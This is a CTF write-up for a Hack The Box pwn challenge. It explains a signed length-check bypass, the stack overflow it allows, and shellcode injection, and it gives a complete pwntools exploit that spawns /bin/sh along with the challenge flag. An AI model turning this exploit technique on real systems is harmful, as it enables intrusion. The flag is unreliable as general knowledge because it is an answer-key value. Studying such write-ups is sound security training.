---
title: "Optimistic"
ctf: "HTB"
date: 2026-06-08
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
author: "anonymous"
---

# Optimistic

## Summary

Stack-based buffer overflow via signed comparison bypass (`-1` passes `jle 0x40` check), leading to shellcode injection on an NX-disabled stack. A stack address leak (`%p`) enables PIE bypass.

## Solution

### Analysis

The binary:
- **NX disabled** → shellcode on stack
- **PIE enabled** → need address leak (provided via `%p` leak of rbp)
- **No canary** → stack overflow protection absent

The program:
1. Leaks rbp address (free gift)
2. Reads "Email" (8 bytes) and "Age" (up to 8 bytes) — unchecked
3. Reads "Length of name" via `scanf("%d")` — checked with `jle` (signed compare to 0x40)
4. Reads "Name" into `buf+0x20` with up to `length` bytes
5. Validates that first `bytes_read - 9` characters are alphanumeric (`isalpha` or `0-9`)

**Key bugs:**
- `jle` is signed: entering `-1` passes the `<= 0x40` check, but `read()` gets `0xFFFFFFFF` as count
- Only `bytes_read - 9` chars are validated: the last 9 bytes are unchecked
- Return address (at offset 104 from `buf+0x20`) falls in those unchecked 9 bytes

### Exploit

1. **Yes** → get stack leak (`rbp`)
2. **Email** + **Age** = 13-byte first-stage shellcode: `read(0, rsp, 0x100); jmp rsp`
3. **Length** = `-1` (bypasses 64-byte limit, enables full overflow)
4. **Name** = 96 bytes `'A'` + 8 bytes fake rbp (alphanumeric) + 8 bytes return address (leaked `rbp - 0x70`) + padding
5. First stage reads and jumps to second stage: `execve("/bin/sh", NULL, NULL)`

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
LOCAL = '--remote' not in sys.argv

def start():
    if LOCAL:
        return process('./challenge/optimistic')
    else:
        return remote(sys.argv[1], int(sys.argv[2]))

p = start()

# Stage 1: read(0, rsp, 0x100); jmp rsp
stage1 = asm("""
    xor eax, eax
    xor edi, edi
    push rsp
    pop rsi
    cdq
    mov dh, 1
    syscall
    jmp rsp
""")

p.recvuntil(b'(y/n): ')
p.sendline(b'y')
p.recvuntil(b'gift: ')
rbp = int(p.recvline().strip(), 16)
sc_addr = rbp - 0x70

p.recvuntil(b'Email: ')
p.send(stage1[:8])
p.recvuntil(b'Age: ')
p.send(stage1[8:13])
p.recvuntil(b'Length of name: ')
p.sendline(b'-1')

payload = b'A' * 96 + b'AAAAAAAA' + p64(sc_addr) + b'C'
p.recvuntil(b'Name: ')
p.send(payload)

stage2 = asm("""
    xor esi, esi
    mul esi
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    mov al, 59
    syscall
""")

sleep(0.3)
p.send(stage2)
sleep(0.3)
p.sendline(b'cat flag.txt 2>/dev/null; ls')
p.interactive()
```

## Flag

```
HTB{be1ng_negat1v3_pays_0ff!}
```
